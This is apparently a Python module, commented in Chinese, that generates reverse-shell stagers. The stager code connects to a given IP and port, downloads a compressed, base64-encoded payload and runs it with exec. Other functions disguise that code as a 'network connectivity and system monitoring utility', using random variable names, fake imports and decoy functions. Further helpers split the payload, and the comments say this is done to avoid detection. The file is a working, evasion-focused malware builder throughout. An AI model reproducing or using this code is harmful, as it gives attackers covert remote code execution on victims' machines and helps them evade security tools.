# -*- coding: utf-8 -*-
"""
代码生成模块
提供反向Shell代码生成功能
"""
import random
import string
import datetime


def generate_random_strings():
    """生成随机字符串用于混淆"""
    random_vars = {}
    for i in range(5):
        var_name = ''.join(random.choices(string.ascii_letters, k=8))
        var_value = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        random_vars[var_name] = var_value
    return random_vars


def split_string(s, chunk_size=50):
    """分割字符串以避免特征检测"""
    return [s[i:i+chunk_size] for i in range(0, len(s), chunk_size)]


def gene_code_obfuscated(ip, port, retry=10, delay=5):
    """生成混淆的反向Shell连接代码"""
    # 分解关键字符串
    imports = ["socket", "zlib", "base64", "struct", "time"]
    random.shuffle(imports)
    
    # 使用变量名混淆
    var_names = generate_random_strings()
    var_list = list(var_names.keys())
    
    template = """# -*- coding: utf-8 -*-
import {imports}
{random_vars}
def {func_name}():
    {var1} = 2
    {var2} = {retry}
    {var3} = '{ip}'
    {var4} = {port}
    {var5} = {delay}
    for {counter} in range({var2}):
        try:
            {sock} = socket.socket({var1}, socket.SOCK_STREAM)
            {sock}.connect(({var3}, {var4}))
            break
        except:
            time.sleep({var5})
    {length} = struct.unpack('>I', {sock}.recv(4))[0]
    {data} = {sock}.recv({length})
    while len({data}) < {length}:
        {data} += {sock}.recv({length} - len({data}))
    exec(zlib.decompress(base64.b64decode({data})), {{'{sock}': {sock}}})
{func_name}()"""
    
    # 生成随机变量赋值
    random_var_assignments = '\n'.join([f"{k} = '{v}'" for k, v in var_names.items()])
    
    code = template.format(
        imports=', '.join(imports),
        random_vars=random_var_assignments,
        func_name=''.join(random.choices(string.ascii_letters, k=10)),
        var1=''.join(random.choices(string.ascii_letters, k=6)),
        var2=''.join(random.choices(string.ascii_letters, k=6)),
        var3=''.join(random.choices(string.ascii_letters, k=6)),
        var4=''.join(random.choices(string.ascii_letters, k=6)),
        var5=''.join(random.choices(string.ascii_letters, k=6)),
        counter=''.join(random.choices(string.ascii_letters, k=6)),
        sock=''.join(random.choices(string.ascii_letters, k=6)),
        length=''.join(random.choices(string.ascii_letters, k=6)),
        data=''.join(random.choices(string.ascii_letters, k=6)),
        retry=retry,
        ip=ip,
        port=port,
        delay=delay
    )
    
    return code


def gene_code(ip, port, retry=10, delay=5):
    """生成反向Shell连接代码（简单版本）"""
    s = """import socket,zlib,base64,struct,time
for x in range(%d):
    try:
        s = socket.socket(2, socket.SOCK_STREAM)
        s.connect(('%s', %d))
        break
    except:
        time.sleep(%d)
l = struct.unpack('>I', s.recv(4))[0]
d = s.recv(l)
while len(d) < l:
    d += s.recv(l - len(d))
exec(zlib.decompress(base64.b64decode(d)), {'s': s})"""
    return s % (retry, ip, port, delay)


def generate_random_string(length=10):
    """生成随机字符串"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def advanced_obfuscate_code(code):
    """高级代码混淆"""
    # 添加假的导入和函数
    fake_imports = [
        "import urllib.request",
        "import urllib.parse", 
        "import ssl",
        "import threading",
        "import subprocess"
    ]
    
    fake_functions = [
        """def check_network_connection():
    try:
        urllib.request.urlopen('https://www.google.com', timeout=1)
        return True
    except:
        return False""",
        
        """def get_system_info():
    import platform
    return {{
        'system': platform.system(),
        'version': platform.version(),
        'machine': platform.machine()
    }}""",
        
        """def validate_ssl_cert(hostname):
    try:
        context = ssl.create_default_context()
        return True
    except:
        return False"""
    ]
    
    # 生成随机变量
    dummy_vars = []
    for i in range(random.randint(3, 7)):
        var_name = ''.join(random.choices(string.ascii_letters, k=8))
        var_value = random.choice([
            f"'{generate_random_string(20)}'",
            str(random.randint(1000, 9999)),
            "[]",
            "{}"
        ])
        dummy_vars.append(f"{var_name} = {var_value}")
    
    # 组装混淆代码
    obfuscated = f"""#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
Network connectivity and system monitoring utility
Generated on: {datetime.datetime.now()}
Version: {random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}
'''

{chr(10).join(fake_imports)}

# Configuration variables
{chr(10).join(dummy_vars)}

{chr(10).join(fake_functions)}

def main_process():
    '''Main processing function'''
    # Initialize system check
    if check_network_connection():
        # Process network data
{chr(10).join(['    ' + line for line in code.split(chr(10))])}

if __name__ == '__main__':
    main_process()
"""
    return obfuscated


def split_payload(data, num_chunks=3):
    """将代码分割成多个部分，分阶段执行，避免被检测"""
    chunks = []
    chunk_size = len(data) // num_chunks
    for i in range(0, len(data), chunk_size):
        end = i + chunk_size
        if end > len(data):
            end = len(data)
        chunks.append(data[i:end])
    return chunks
